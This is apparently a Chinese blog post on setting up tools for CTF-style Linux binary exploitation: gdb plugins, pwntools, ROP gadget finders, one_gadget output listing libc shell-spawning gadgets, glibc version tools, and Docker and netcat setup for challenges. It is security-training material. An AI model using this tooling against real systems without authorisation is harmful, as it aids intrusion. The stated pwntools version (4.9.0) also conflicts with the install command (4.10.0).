<h2 id="pwn-相关工具"><a href="#pwn-相关工具" class="headerlink" title="pwn 相关工具"></a>pwn 相关工具</h2><h3 id="clion"><a href="#clion" class="headerlink" title="clion"></a>clion</h3><p><a class="link"   href="https://www.jetbrains.com/clion/download/#section=linux" >clion <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是一款 C\C++ 的 IDE ，可以用来阅读 glibc 源码的工具，这款工具对<strong>宏展开</strong>，<strong>符号跳转</strong>，<strong>结构体大小以及成员偏移计算</strong>都有很好的支持。这款软件需要付费使用，不过可以某宝搞一个教育邮箱。</p>
<p>首先用打开 <a class="link"   href="https://gitcode.net/qq_45323960/debug_glibc" >debug_glibc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 解压后的 glibc  源码，这里有以下几点需要注意：</p>
<ul>
<li>源码在对应版本的 <code>source</code> 目录下。</li>
<li>最好不要使用解压到默认 <code>\glibc</code> 路径下的源码，因为源码调试与行号绑定，阅读源码可能会修改到源码。</li>
<li>这里用 <code>debug_glibc</code> 中的源码是因为这里的源码是编译过的，clion 分析代码需要编译的配置文件。</li>
</ul>
<p>然后这里我们看到 Makefile 没有正确导入：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232611195.png"
                      alt="image-20241107232611195"
                ><br>在较新版本的 clion 中位于 <code>source</code> 根目录下的 <code>autoreconf</code> 的配置文件 <code>configure.ac</code> 配置有问题，需要改成以下内容（这个主要看版本，有时默认的就好使)：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">GLIBC_PROVIDES dnl See aclocal.m4 <span class="keyword">in</span> the top level <span class="built_in">source</span> directory.</span><br><span class="line"><span class="comment"># Local configure fragment for sysdeps/i386.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We no longer support i386 since it lacks the atomic instructions</span></span><br><span class="line"><span class="comment"># required to implement NPTL threading.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$config_machine</span>&quot;</span> = i386; <span class="keyword">then</span></span><br><span class="line">  AC_MSG_ERROR([</span><br><span class="line">*** ERROR: Support <span class="keyword">for</span> i386 is deprecated.</span><br><span class="line">*** Please use host i786, i686, i585 or i486.</span><br><span class="line">*** For example: /src/glibc/configure --host=i686-pc-linux-gnu ...<span class="string">&quot;])</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># The GNU C Library can&#x27;t be built for i386.  There are several reasons for</span></span><br><span class="line"><span class="string"># this restriction.  The primary reason is that i386 lacks the atomic</span></span><br><span class="line"><span class="string"># operations required to support the current NPTL implementation.  While it is</span></span><br><span class="line"><span class="string"># possible that such atomic operations could be emulated in the kernel to date</span></span><br><span class="line"><span class="string"># no such work has been done to enable this.  Even with NPTL disabled you still</span></span><br><span class="line"><span class="string"># have no atomic.h implementation.  Given the declining use of i386 we disable</span></span><br><span class="line"><span class="string"># support for building with `-march=i386&#x27; or `-mcpu=i386.&#x27; We don&#x27;t explicitly</span></span><br><span class="line"><span class="string"># check for i386, instead we make sure the compiler has support for inlining</span></span><br><span class="line"><span class="string"># the builtin __sync_val_compare_and_swap. If it does then we should have no</span></span><br><span class="line"><span class="string"># problem building for i386.</span></span><br><span class="line"><span class="string">LIBC_COMPILER_BUILTIN_INLINED(</span></span><br><span class="line"><span class="string">  [__sync_val_compare_and_swap],</span></span><br><span class="line"><span class="string">  [int a, b, c; __sync_val_compare_and_swap (&amp;a, b, c);],</span></span><br><span class="line"><span class="string">  [-O0],</span></span><br><span class="line"><span class="string">  [libc_cv_unsupported_i386=no],</span></span><br><span class="line"><span class="string">  [AC_MSG_ERROR([</span></span><br><span class="line"><span class="string">*** Building with -march=i386/-mcpu=i386 is not supported.</span></span><br><span class="line"><span class="string">*** Please use host i786, i686, i586, or i486.</span></span><br><span class="line"><span class="string">*** For example: /source/glibc/configure CFLAGS=&#x27;-O2 -march=i686&#x27; ...])])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dnl Check whether asm supports Intel MPX</span></span><br><span class="line"><span class="string">AC_CACHE_CHECK(for Intel MPX support, libc_cv_asm_mpx, [dnl</span></span><br><span class="line"><span class="string">cat &gt; conftest.s &lt;&lt;\EOF</span></span><br><span class="line"><span class="string">        bndmov %bnd0,(%esp)</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="string">if AC_TRY_COMMAND(<span class="variable">$&#123;CC-cc&#125;</span> -c <span class="variable">$ASFLAGS</span> conftest.s 1&gt;&amp;AS_MESSAGE_LOG_FD); then</span></span><br><span class="line"><span class="string">  libc_cv_asm_mpx=yes</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">  libc_cv_asm_mpx=no</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">rm -f conftest*])</span></span><br><span class="line"><span class="string">if test <span class="variable">$libc_cv_asm_mpx</span> == yes; then</span></span><br><span class="line"><span class="string">  AC_DEFINE(HAVE_MPX_SUPPORT)</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">AC_DEFINE(USE_REGPARMS)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dnl It is always possible to access static and hidden symbols in an</span></span><br><span class="line"><span class="string">dnl position independent way.</span></span><br><span class="line"><span class="string">AC_DEFINE(PI_STATIC_AND_HIDDEN)</span></span><br></pre></td></tr></table></figure></div>
<p>另外还需要右键 Makefile 设置在命令后面添加 <code>--disable-sanity-checks</code> 。另外构建目标要填 <code>all</code> ，否则 clion 分析的源码的不全。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232825793.png"
                      alt="image-20241107232825793"
                ><br>完整预配置命令如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># GNU Autotools template, feel free to customize.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="built_in">which</span> autoreconf &gt;/dev/null &amp;&amp; autoreconf --install --force --verbose <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>&quot;</span> 2&gt;&amp;1; /bin/sh <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>/configure&quot;</span> --disable-sanity-checks</span><br></pre></td></tr></table></figure></div>
<p>之后右键重新加载 Makefile 项目。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232847285.png"
                      alt="image-20241107232847285"
                ><br>不勾选清理项目。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232907035.png"
                      alt="image-20241107232907035"
                ><br>如果最后这样说明导入成功，之后耐心等待项目导入完毕即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232925754.png"
                      alt="image-20241107232925754"
                ></p>
<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install gdb gdb-multiarch</span><br></pre></td></tr></table></figure></div>
<h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>注意我这里的 pwntools 是 python2 版本的，需要指定为 4.9.0 ，因为高版本的 pwntools 已经不支持 python2 了（具体来说是高版本的 pwntools 必须依赖 unicorn 2.x.x ，而 unicorn 2.x.x 只支持 python3）。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools==4.10.0 -i https://pypi.tuna.tsinghua.edu.cn/simple </span><br></pre></td></tr></table></figure></div>
<p>如果已经装了 pwntools 需要先卸载干净再重新安装，否则更改版本无效（最好不带 <code>sudo</code> 也来一遍确保卸载干净）。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip2 uninstall pwntools</span><br><span class="line"><span class="built_in">sudo</span> pip2 uninstall unicorn</span><br></pre></td></tr></table></figure></div>
<p>这样安装的 pwntools 的 plt 功可能无法正常使用，需要手动安装 Unicorn 库。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install unicorn==1.0.3 -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></div>
<p>当然这样做的代价是一些特殊架构老版本的 pwntools 不支持，这时候最好换 python3 的 pwntools 。</p>
<h3 id="gdb-插件"><a href="#gdb-插件" class="headerlink" title="gdb 插件"></a>gdb 插件</h3><p>主要有 pwndbg，peda，gef ，这里我常用的是 pwndbg 。对于一些版本过于古老导致环境装不上的可以尝试一下 peda 。</p>
<p>先将三个项目的代码都拉取下来。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef.git</span><br></pre></td></tr></table></figure></div>
<p>pwndbg 需要运行初始化脚本。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line"><span class="built_in">sudo</span> ./setup.sh</span><br></pre></td></tr></table></figure></div>
<p>另外还有一个 pwngdb 插件在调试多线程堆（<code>heapinfoall</code> 命令）的时候很有用，建议安装。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git </span><br></pre></td></tr></table></figure></div>
<p>gdb 在启动的时候会读取当前用户的主目录的 <code>.gdbinit</code> 文件进行 gdb 插件的初始化，这里提供一个配置方案。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /home/sky123/tools/pwndbg/gdbinit.py </span><br><span class="line"><span class="comment">#source /home/sky123/tools/peda/peda.py</span></span><br><span class="line"><span class="comment">#source /home/sky123/tools/gef/gef.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#source /home/sky123/tools/muslheap/muslheap.py</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /home/sky123/tools/Pwngdb/pwngdb.py</span><br><span class="line"><span class="built_in">source</span> /home/sky123/tools/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <ul>
<li>以普通用权限和管理员权限启动 gdb 时读取的 <code>.gdbinit</code> 文件的路径是不同的，普通权限读取的是 <code>/home/&lt;username&gt;/.gdbinit</code> 而管理员权限读取的是 <code>/root/.gdbinit</code> 。</li>
<li>上述配置方案是为了使用 <code>Pwngdb</code> 插件，而该插件唯一的作用就是打印每个线程的对应的 <code>tcache</code>，而实际上这个库已经很久不维护了，因此建议还是直接 <code>source /home/sky123/tools/pwndbg/gdbinit.py</code>。</li>
</ul>

    </div>
  </div>

<p>pwndbg 安装 ghidra 插件可以支持代码反编译（<del>虽然没啥用</del> ）</p>
<ul>
<li>安装 <code>r2pipe</code> 库  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install r2pipe</span><br></pre></td></tr></table></figure></div></li>
<li>下载安装 radere2 项目  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/radareorg/radare2.git</span><br><span class="line"><span class="built_in">cd</span> radare2</span><br><span class="line"><span class="built_in">sudo</span> sys/install.sh</span><br></pre></td></tr></table></figure></div></li>
<li>下载编译安装 r2ghidra 项目  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/radareorg/r2ghidra.git</span><br><span class="line"><span class="built_in">cd</span> r2ghidra</span><br><span class="line"><span class="built_in">sudo</span> ./preconfigure</span><br><span class="line"><span class="built_in">sudo</span> ./configure</span><br><span class="line"><span class="built_in">sudo</span> make -j16</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="gadget-搜索工具"><a href="#gadget-搜索工具" class="headerlink" title="gadget 搜索工具"></a>gadget 搜索工具</h3><h4 id="ROPgdbget"><a href="#ROPgdbget" class="headerlink" title="ROPgdbget"></a>ROPgdbget</h4><p>安装：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div>
<p>使用：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ntdll.dll &gt; rop</span><br></pre></td></tr></table></figure></div>
<p>有时候 <code>ROPgadget</code> 会出现如下报错：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary init_60D_fwf &gt; rop</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/bin/ROPgadget&quot;</span>, line 12, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    ropgadget.main()</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/__init__.py&quot;</span>, line 30, <span class="keyword">in</span> main</span><br><span class="line">    sys.exit(0 <span class="keyword">if</span> Core(args.getArgs()).analyze() <span class="keyword">else</span> 1)</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/core.py&quot;</span>, line 257, <span class="keyword">in</span> analyze</span><br><span class="line">    self.__getGadgets()</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/core.py&quot;</span>, line 70, <span class="keyword">in</span> __getGadgets</span><br><span class="line">    G = Gadgets(self.__binary, self.__options, self.__offset)</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/gadgets.py&quot;</span>, line 24, <span class="keyword">in</span> __init__</span><br><span class="line">    <span class="keyword">elif</span> self.__arch == CS_ARCH_ARM64:</span><br><span class="line">NameError: name <span class="string">&#x27;CS_ARCH_ARM64&#x27;</span> is not defined. Did you mean: <span class="string">&#x27;CS_ARCH_ARM&#x27;</span>?</span><br></pre></td></tr></table></figure></div>

<p>此时需要重新安装 <code>capstone</code>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip uninstall capstone</span><br><span class="line"><span class="built_in">sudo</span> pip install capstone</span><br></pre></td></tr></table></figure></div>

<h4 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h4><ul>
<li>安装：<ul>
<li>在 pypi 的 <a class="link"   href="https://pypi.org/project/ropper/#files" >ropper 官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>上下载 ropper</li>
<li>运行安装脚本完成 ropper 安装  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li>使用：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ropper --file ./pwn --nocolor &gt; rop</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h4><p>用于搜索 libc 中能够实现 <code>execve(&quot;/bin/sh&quot;, (char *[2]) &#123;&quot;/bin/sh&quot;, NULL&#125;, NULL);</code> 的效果的跳转地址，由于是采用特征匹配的方法，因此只能是在 libc 中查找。</p>
<ul>
<li><p>安装：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y ruby ruby-dev</span><br><span class="line"><span class="built_in">sudo</span> gem install one_gadget</span><br></pre></td></tr></table></figure></div></li>
<li><p>使用：可以查找到 gadget 地址以及条件限制。</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x50a37 posix_spawn(rsp+0x1c, <span class="string">&quot;/bin/sh&quot;</span>, 0, rbp, rsp+0x60, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line">  rbp == NULL || (u16)[rbp] == NULL</span><br><span class="line"></span><br><span class="line">0xebcf1 execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [r10] == NULL || r10 == NULL</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="line"></span><br><span class="line">0xebcf5 execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [r10] == NULL || r10 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xebcf8 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure></div>
<p>  如果 <code>one_gadget</code> 在一个版本的 Ubuntu 中搜索某一版本的 glibc 的 gadget 出现如下报错可以尝试换另一个版本的 Ubuntu 。貌似是权限问题，可以以 root 权限重新装一下。</p>
<p>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107233247289.png"
                      alt="image-20241107233247289"
                ></p>
</li>
</ul>
<h3 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h3><p>用于查看和生成程序沙箱规则。</p>
<ul>
<li>安装：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gem install seccomp-tools</span><br></pre></td></tr></table></figure></div></li>
<li>使用：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">seccomp-tools dump ./pwn</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>通过泄露的 libc 中函数的地址来确定 libc 版本。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div>
<h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><p>临时找 glibc 和 ld 或者编译 glibc 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br></pre></td></tr></table></figure></div>
<p>更新下载列表：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  glibc-all-in-one ./update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">➜  glibc-all-in-one <span class="built_in">cat</span> list</span><br><span class="line">2.23-0ubuntu10_amd64</span><br><span class="line">2.23-0ubuntu10_i386</span><br><span class="line">2.23-0ubuntu11_amd64</span><br><span class="line">2.23-0ubuntu11_i386</span><br><span class="line">2.23-0ubuntu3_amd64</span><br><span class="line">2.23-0ubuntu3_i386</span><br><span class="line">2.27-3ubuntu1_amd64</span><br><span class="line">2.27-3ubuntu1_i386</span><br><span class="line">2.28-0ubuntu1_amd64</span><br><span class="line">2.28-0ubuntu1_i386</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">➜  glibc-all-in-one <span class="built_in">cat</span> old_list</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4_amd64</span><br><span class="line">2.21-0ubuntu4_amd64</span><br><span class="line">2.24-3ubuntu1_amd64</span><br><span class="line">2.24-3ubuntu1_amd64</span><br><span class="line">2.24-3ubuntu2.2_amd64</span><br><span class="line">2.24-3ubuntu2.2_amd64</span><br><span class="line">2.24-9ubuntu2.2_amd64</span><br><span class="line">2.24-9ubuntu2.2_amd64</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
<p>下载 libc ，注意要安装解压工具 <code>zstd</code> ，因为下载脚本中用到了。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install zstd</span><br><span class="line"><span class="built_in">cat</span> list |xargs -i ./download &#123;&#125;</span><br><span class="line"><span class="built_in">cat</span> old_list |xargs -i ./download_old &#123;&#125;</span><br></pre></td></tr></table></figure></div>
<p>编译 libc</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./build [版本例如2.29] [架构例如 i686 amd64]</span><br></pre></td></tr></table></figure></div>

<h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><p>安装：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install patchelf</span><br></pre></td></tr></table></figure></div>
<h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu-user qemu-system </span><br></pre></td></tr></table></figure></div>
<h1 id="如何使用题目提供的-docker-环境"><a href="#如何使用题目提供的-docker-环境" class="headerlink" title="如何使用题目提供的 docker 环境"></a>如何使用题目提供的 docker 环境</h1><h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><p>在<a class="link"   href="https://netcat.sourceforge.net/" >官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载项目源码，使用如下命令进行编译。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./configure LDFLAGS=-static <span class="comment"># 考虑到 docker 环境恶劣选择静态编译</span></span><br><span class="line">make -j24 <span class="comment"># 编译</span></span><br></pre></td></tr></table></figure></div>
<p>编译后生成的 <code>netcat</code> 位于项目 <code>src</code> 目录下。<code>netcat</code> 即我们常用的 <code>nc</code> 命令对应的可执行程序。</p>
<p>在 docker 中使用如下命令将题目 io 映射到 8888 端口。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./netcat -lvp 8888 -e ./pwn</span><br></pre></td></tr></table></figure></div>

<p>在本机可以使用如下命令连接并交互。（前提是 docker 的 8888 端口映射到本机的 8888 端口）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 8888</span><br></pre></td></tr></table></figure></div>
<h2 id="gdb-1"><a href="#gdb-1" class="headerlink" title="gdb"></a>gdb</h2><p>在<a class="link"   href="https://www.sourceware.org/gdb/download/" >官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载项目源码，使用如下命令编译 gdbserver ：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install libgmp-dev libmpfr-dev</span><br><span class="line"><span class="built_in">cd</span> gdb-9.2/gdb/gdbserver</span><br><span class="line">./configure LDFLAGS=-static</span><br><span class="line">make -j $(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure></div>
<p>对于 gdb ，由于编译 gdb 时依赖的静态库需要提前编译，因此想要编译 gdb 最好直接编译整个项目：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> gdb-9.2</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">../configure   LDFLAGS=-static</span><br><span class="line">make -j $(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure></div>

<p>注意以下几点：</p>
<ul>
<li>编译的 <code>gdbserver</code> 版本一定要与本机的 <code>gdb</code> 匹配，不同版本的 <code>gdbserver</code> 通信协议不同。</li>
<li>有的时候在 <code>gdbserver</code> 中运行 <code>./configuer</code> 命令会出现找不到 <code>Makefile</code> 的情况，这时在根目录进行一次编译就好了。</li>
<li>连接失败之后再运行一次编译命令就可能编译成功。</li>
<li><code>gdb</code> 位于 <code>./gdb/gdb</code> 中。</li>
<li><code>gdbserver</code> 位于 <code>./gdbserver/gdbserver</code> 中。</li>
</ul>
<h2 id="docker-1"><a href="#docker-1" class="headerlink" title="docker"></a>docker</h2><ul>
<li>加载镜像  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker load -i 题目附件.tar</span><br></pre></td></tr></table></figure></div></li>
<li>查看现有镜像  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure></div></li>
<li>启动容器  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --privileged -it -w /home/ctf -v ~/Desktop/本机目录:/home/ctf/镜像目录 -p 8888:8888 -p 9999:9999 镜像名 /bin/bash </span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>--privileged</code>：加这个参数才能 <code>gdbserver</code> 附加进程远程调试</li>
<li><code>-v</code>：目录映射，方便传文件。</li>
<li><code>-p</code>：端口映射，开两个端口分别给 <code>netcat</code> 和 <code>gdbserver</code> 用。改用 <code>--net=host</code> 可以映射全部端口。</li>
<li><code>-w</code>：进入 docker 后目录为 <code>/home/ctf</code> 。</li>
</ul>
</li>
<li>查看现有容器   <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure></div></li>
<li>进容器 shell ，即同一个容器再开一个 shell 。  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -it -w /home/ctf 容器ID /bin/bash</span><br></pre></td></tr></table></figure></div></li>
<li>停止所有容器：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div></li>
<li>删除所有容器：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div></li>
<li>删除所有镜像：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><code>exp.py</code> 模板如下：</p>
